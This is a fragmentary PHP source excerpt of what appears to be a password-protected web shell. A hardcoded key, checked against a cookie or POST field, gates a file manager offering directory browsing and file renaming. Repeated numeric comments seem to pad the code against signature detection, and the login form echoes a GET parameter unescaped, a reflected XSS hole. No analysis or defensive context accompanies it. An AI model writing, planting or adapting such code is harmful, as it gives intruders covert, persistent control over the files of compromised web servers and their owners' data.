...
$auth_key = "901f7d65026e374e3acb885dd495c81b";
...
$pass = false;
if (isset($_COOKIE['pw_name_17096'])) {
    if(($_COOKIE['pw_name_17096']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_17096'])) {
        if(($_POST['pw_name_17096']) == $auth_key) {
            setcookie("pw_name_17096", $_POST['pw_name_17096']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_17096' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726454017721928 1726454017249955 1726454017179445 1726454017117102
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726454017721928 1726454017249955 1726454017179445 1726454017117102
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726454017721928 1726454017249955 1726454017179445 1726454017117102
            $name = PATH . "/" . $_GET['r'];
